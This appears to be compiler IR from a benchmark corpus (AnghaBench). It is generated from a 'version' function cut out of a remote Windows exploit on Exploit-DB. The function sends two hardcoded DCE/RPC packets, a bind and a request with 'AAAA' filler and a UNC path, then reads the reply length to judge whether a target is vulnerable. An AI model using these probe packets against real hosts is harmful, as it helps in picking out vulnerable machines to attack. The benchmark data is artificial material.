; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_109.c_version.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_109.c_version.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }

@__const.version.peer0_0 = private unnamed_addr constant [204 x i8] c"\05\00\0B\03\10\00\00\00\CC\00\00\00\84g\BE\181\14\\\16\00\00\00\00\04\00\00\00\01\00\01\00\B8J\9FM\1C}\CF\11\86\1E\00 \AFn|W\00\00\00\00\04]\88\8A\EB\1C\C9\11\9F\E8\08\00+\10H`\02\00\00\00\02\00\01\00\A0\01\00\00\00\00\00\00\C0\00\00\00\00\00\00F\00\00\00\00\04]\88\8A\EB\1C\C9\11\9F\E8\08\00+\10H`\02\00\00\00\03\00\01\00\0AB$\0A\00\17!A.H\01\1D\13\0B\04M\00\00\00\00\04]\88\8A\EB\1C\C9\11\9F\E8\08\00+\10H`\02\00\00\00\04\00\01\00\B0\01R\97\CAY\CF\11\A8\D5\00\A0\C9\0D\80Q\00\00\00\00\04]\88\8A\EB\1C\C9\11\9F\E8\08\00+\10H`\02\00\00\00", align 16
@__const.version.peer0_1 = private unnamed_addr constant [170 x i8] c"\05\00\00\03\10\00\00\00\AA\00\00\00AAAA\80\00\00\00\01\00\00\00\05\00\06\00\00\00\00\00\00\00\00\00(c) uer\84 ssS \82\80g\00\00\00\00\80\1D\94^\96\BF\CD\11\B5y\08\00+0\BF\EB\01\00\00\00\10\00\00\00\00\00\00\00\10\00\00\00\\\00\\\00A\00\00\00A\00A\00\\\00C\00$\00\\\00A\00.\00t\00x\00t\00\00\00\00\00\00\00\02\00\00\00\FF\FF\FF\FF\01\00\00\00Xs\0B\00\01\00\00\001\01\00\00\00\00\00\00\C0\00\00\00\00\00\00F\01\00\00\00\01\00\00\00\07\00", align 16

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @version(i8* %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [204 x i8], align 16
  %7 = alloca [170 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca [1024 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca %struct.timeval, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  %12 = bitcast [204 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([204 x i8], [204 x i8]* @__const.version.peer0_0, i32 0, i32 0), i64 204, i1 false)
  %13 = bitcast [170 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([170 x i8], [170 x i8]* @__const.version.peer0_1, i32 0, i32 0), i64 170, i1 false)
  %14 = call i32 @FD_ZERO(i32* %8)
  %15 = load i32, i32* %5, align 4
  %16 = call i32 @FD_SET(i32 %15, i32* %8)
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i32 6, i32* %17, align 8
  %18 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %18, align 8
  %19 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %20 = call i32 @memset(i8* %19, i8 signext 0, i32 1024)
  %21 = load i32, i32* %5, align 4
  %22 = getelementptr inbounds [204 x i8], [204 x i8]* %6, i64 0, i64 0
  %23 = call i32 @send(i32 %21, i8* %22, i32 204, i32 0)
  %24 = load i32, i32* %5, align 4
  %25 = add nsw i32 %24, 1
  %26 = call i64 @select(i32 %25, i32* %8, i32* null, i32* null, %struct.timeval* %11)
  %27 = icmp sgt i64 %26, 0
  br i1 %27, label %28, label %54

28:                                               ; preds = %2
  %29 = load i32, i32* %5, align 4
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %31 = call i32 @recv(i32 %29, i8* %30, i32 1024, i32 0)
  store i32 %31, i32* %10, align 4
  %32 = load i32, i32* %5, align 4
  %33 = getelementptr inbounds [170 x i8], [170 x i8]* %7, i64 0, i64 0
  %34 = call i32 @send(i32 %32, i8* %33, i32 170, i32 0)
  %35 = load i32, i32* %5, align 4
  %36 = add nsw i32 %35, 1
  %37 = call i64 @select(i32 %36, i32* %8, i32* null, i32* null, %struct.timeval* %11)
  %38 = icmp sgt i64 %37, 0
  br i1 %38, label %39, label %53

39:                                               ; preds = %28
  %40 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %41 = call i32 @memset(i8* %40, i8 signext 0, i32 1024)
  %42 = load i32, i32* %5, align 4
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %44 = call i32 @recv(i32 %42, i8* %43, i32 1024, i32 0)
  store i32 %44, i32* %10, align 4
  %45 = load i32, i32* %10, align 4
  %46 = icmp eq i32 %45, 32
  br i1 %46, label %47, label %50

47:                                               ; preds = %39
  %48 = load i32, i32* %5, align 4
  %49 = call i32 @closesocket(i32 %48)
  store i32 1, i32* %3, align 4
  br label %57

50:                                               ; preds = %39
  %51 = load i32, i32* %5, align 4
  %52 = call i32 @close(i32 %51)
  store i32 0, i32* %3, align 4
  br label %57

53:                                               ; preds = %28
  store i32 -1, i32* %3, align 4
  br label %57

54:                                               ; preds = %2
  %55 = load i32, i32* %5, align 4
  %56 = call i32 @closesocket(i32 %55)
  store i32 -1, i32* %3, align 4
  br label %57

57:                                               ; preds = %54, %53, %50, %47
  %58 = load i32, i32* %3, align 4
  ret i32 %58
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i64 @select(i32, i32*, i32*, i32*, %struct.timeval*) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @closesocket(i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
